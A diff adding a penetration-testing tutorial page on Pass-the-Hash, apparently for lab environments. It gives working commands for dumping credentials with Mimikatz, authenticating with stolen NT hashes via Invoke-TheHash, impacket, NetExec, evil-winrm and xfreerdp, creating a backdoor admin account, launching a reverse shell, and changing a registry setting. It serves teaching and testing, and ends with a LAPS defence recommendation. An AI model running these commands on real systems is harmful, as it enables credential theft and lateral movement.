@@ -1,0 +1,184 @@
+---
+title: "Pass the Hash (PtH)"
+---
+
+<Info>
+**What it is**
+
+Pass the Hash is the technique of authenticating to a Windows system using a user's **NT hash directly**, without ever cracking it back to the plaintext password. Because NTLM authentication only ever uses the hash as its secret (see [Windows Authentication - NTLM & Kerberos](/password-attacks/windows-authentication-ntlm-kerberos)), possessing the hash is functionally equivalent to knowing the password.
+</Info>
+
+## Why it works
+
+NTLM is a challenge–response protocol: the client proves it knows the password by encrypting a server-issued challenge with the **NT hash** — the plaintext is never used. Critically, **Windows NT hashes are not salted**, so the hash is a static, reusable credential. If you can read a user's NT hash out of memory or a credential store, you can compute valid NTLM responses as that user. That's the whole attack. (Full protocol detail: [Windows Authentication - NTLM & Kerberos](/password-attacks/windows-authentication-ntlm-kerberos).)
+
+This is why PtH is one of the most reliable lateral-movement techniques in AD: organisations reuse local administrator passwords across many machines, so a single dumped local-admin hash often unlocks dozens of hosts.
+
+## Prerequisites — getting the hash
+
+PtH starts *after* you've already obtained a hash, which requires **local admin / SYSTEM** on some box. Common sources:
+
+- **Local SAM database** — NT hashes of local accounts (e.g. the local `Administrator`). Great for finding password reuse across a subnet.
+- **NTDS.dit on a Domain Controller** — every domain account's hash (via DCSync / `secretsdump -just-dc`).
+- **LSASS memory** — hashes (and Kerberos keys/tickets) of users currently logged on, via Mimikatz.
+
+<Info>
+**The companion Mimikatz command**
+
+`sekurlsa::logonpasswords` is how you *dump* the hashes from LSASS that you then pass:
+```cmd
+sekurlsa::logonpasswords
+```
+It enumerates credentials for every active logon session — NT hashes, and on older systems sometimes plaintext. Run from an elevated Mimikatz (`privilege::debug` first). The NT hash it prints is what you feed into every command below.
+</Info>
+
+---
+
+## Performing PtH
+
+The hash format you'll pass is the **NT hash** (32 hex chars). Tools that expect `LM:NT` accept a blank LM (`:` then the NT hash). Across all tools, the account whose hash you use **must have admin rights on the target** — PtH grants you *that user's* access, nothing more.
+
+### Windows — Mimikatz (`sekurlsa::pth`)
+
+Mimikatz can spawn a new process in the security context of a user whose hash you supply, by injecting the hash into a fresh logon session. Anything launched from that process authenticates as the target user over the network.
+
+```cmd
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+```
+
+- `privilege::debug` — acquire `SeDebugPrivilege` (needed to manipulate LSASS); requires local admin.
+- `/user` — the account to impersonate.
+- `/rc4` (or `/ntlm`) — the NT hash of that account.
+- `/domain` — the user's domain. For a **local** account use the computer name, `localhost`, or `.`.
+- `/run` — program to launch in the new context (defaults to `cmd.exe`).
+
+**Result:** a new `cmd.exe` whose network authentication uses the injected hash. From it you can reach SMB shares, run `psexec`, etc., as `julio`. **Next step:** use that shell to access the target (`dir \\target\C$`, PsExec, WinRM).
+
+### Windows — Invoke-TheHash (PowerShell)
+
+A set of PowerShell functions that perform PtH over **SMB** or **WMI** by feeding the NT hash into NTLMv2 authentication. Useful when you're already on a Windows host with PowerShell and don't want to drop Mimikatz.
+
+> Local admin **client-side is not required**, but the user+hash you authenticate with **must be admin on the target**.
+
+```powershell
+PS C:\> cd C:\tools\Invoke-TheHash\
+PS C:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+```
+
+**SMB execution** — here, creating a new local admin on the target:
+
+```powershell
+Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+```
+
+**WMI execution** — here, launching an encoded PowerShell reverse shell:
+
+```powershell
+Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <BASE64_ENCODED_REVERSE_SHELL>"
+```
+
+- `-Target` — hostname or IP. `-Username`/`-Hash` — creds to pass. `-Domain` — omit for local accounts or use `user@domain`.
+- `-Command` — what to run on the target. **Omit `-Command`** and the function simply *tests* whether the hash has WMI access — a quick way to confirm a hash works before acting.
+
+<Tip>
+**The `-e` / `-enc` payload**
+
+The base64 blob is a PowerShell reverse shell (encode one from [Reverse shell](/exploitation/reverse-shell) / revshells.com → "PowerShell #3 (Base64)") pointed at your listener. Start a listener (`nc -lvnp <port>`) first.
+</Tip>
+
+---
+
+## Performing PtH from Linux
+
+### impacket (psexec / wmiexec / smbexec / atexec)
+
+[Impacket](https://github.com/fortra/impacket) is the go-to from a Kali box. `impacket-psexec` gives a semi-interactive SYSTEM shell by dropping and running a service; the others trade stealth/footprint differently.
+
+```bash
+impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+- `-hashes LM:NT` — pass the hash; the leading `:` means a blank LM, so only the NT hash is supplied.
+- Alternatives, by execution method and footprint:
+  - `impacket-wmiexec` — WMI, no service created (quieter, semi-interactive).
+  - `impacket-smbexec` — SMB + service, avoids dropping a binary to disk.
+  - `impacket-atexec` — runs a single command via the Task Scheduler.
+
+**Why pick one over another:** `psexec` is loud (creates a service, common AV trigger); `wmiexec` is the usual stealthier default. **Next step:** run `whoami`, then enumerate/loot.
+
+### NetExec — spray a hash across a subnet
+
+[NetExec](https://github.com/Pennyw0rth/NetExec) (successor to CrackMapExec) shines at testing **one hash against many hosts** to find where it grants admin — the practical payoff of a dumped local-admin hash and password reuse.
+
+```bash
+netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+- `smb` — target protocol (also `winrm`, `wmi`, `mssql`, ...).
+- `-u` / `-H` — username / NT hash. `-d .` — domain `.` = local account.
+- Add `--local-auth` when the hash is a **local** SAM hash, so it's tested as a local account on each host (the correct mode for hunting local-admin reuse).
+- **Read the output for `Pwn3d!`** — that flag means the credential is **local admin** on that host. Add `-x '<cmd>'` to execute on every box you own.
+
+<Warning>
+**Lockout caution**
+
+Spraying a **domain** account across hosts can trip account lockout. For local-admin reuse hunting use `--local-auth` (one local login attempt per host). Always know the target's lockout policy first.
+
+**Report recommendation:** widespread local-admin reuse → recommend **LAPS** (randomises and rotates each machine's local admin password), which kills this attack.
+</Warning>
+
+### evil-winrm — PtH over WinRM (PowerShell remoting)
+
+When SMB is blocked/filtered or you want an interactive PowerShell session, authenticate to **WinRM (5985/5986)** with the hash instead.
+
+```bash
+evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+- `-i` target, `-u` user, `-H` NT hash. Inside the session: `upload`/`download` are built in.
+- For a **domain** account, use the full `administrator@inlanefreight.htb` form.
+
+### RDP — PtH for GUI access (xfreerdp)
+
+You can get a graphical session by passing the hash to RDP — useful when a task needs the desktop.
+
+```bash
+xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+```
+
+<Warning>
+**Caveat — Restricted Admin Mode must be enabled**
+
+RDP PtH only works if **Restricted Admin Mode** is on (disabled by default). If you already have code-exec on the target you can enable it by adding this registry value, then connect with `/pth`:
+```cmd
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+</Warning>
+
+---
+
+## When PtH fails (and what to switch to)
+
+- **Target requires Kerberos** (hit by hostname/SPN, NTLM disabled): pass the hash *into Kerberos* instead — **OverPass-the-Hash** to mint a TGT (see [Pass the Ticket from Windows](/password-attacks/pass-the-ticket-from-windows)).
+- **Hash isn't admin on the target:** PtH only gives you that user's rights — re-scope (BloodHound) or find a more privileged hash.
+- **Only captured a Net-NTLMv2 response** (from Responder), not the raw NT hash: that can't be passed — it must be **cracked** or **relayed** (see [Credential Hunting in Network Traffic](/password-attacks/credential-hunting-in-network-traffic)).
+- **AES-only / PtH-hardened** environments: fall back to ticket-based attacks with the AES key.
+
+## Where it fits in a pentest
+
+PtH sits in the **lateral movement / privilege escalation** phase, immediately after a credential dump. Loop is: get local admin on one box → dump SAM/LSASS → take the local-admin (or a domain) hash → NetExec-spray it across the subnet → land on a new host as admin → dump again → repeat until you reach a Domain Admin or the DC.
+
+## Key Takeaways
+
+- PtH reuses an **unsalted NT hash** directly via NTLM — no cracking needed; stealing = using.
+- Getting the hash needs **local admin/SYSTEM** first (SAM / NTDS / LSASS).
+- The hash's value depends entirely on **where that account is admin** — hunt reuse with `netexec ... --local-auth` and watch for `Pwn3d!`.
+- Toolset by situation: **Mimikatz `sekurlsa::pth`** (Windows, spawn-as-user), **Invoke-TheHash** (Windows PS, SMB/WMI), **impacket-*exec** / **evil-winrm** / **xfreerdp** (Linux, by protocol).
+- Blocked by Kerberos-only targets → **OverPass-the-Hash** ([Pass the Ticket from Windows](/password-attacks/pass-the-ticket-from-windows)). Captured a Net-NTLM response instead of a hash → crack or relay it.
+
+## See also
+
+- [Windows Authentication - NTLM & Kerberos](/password-attacks/windows-authentication-ntlm-kerberos) — why hashes authenticate (protocol theory).
+- [Pass the Ticket from Windows](/password-attacks/pass-the-ticket-from-windows) — turning a hash/key into Kerberos tickets.
+- [Credential Hunting in Windows](/password-attacks/credential-hunting-in-windows) / [Credential Hunting in Network Traffic](/password-attacks/credential-hunting-in-network-traffic) — sourcing the hashes.
+- [BloodHound - Complete Guide](/cheatsheets/bloodhound-complete-guide) — find where a hash is admin / the path to DA.
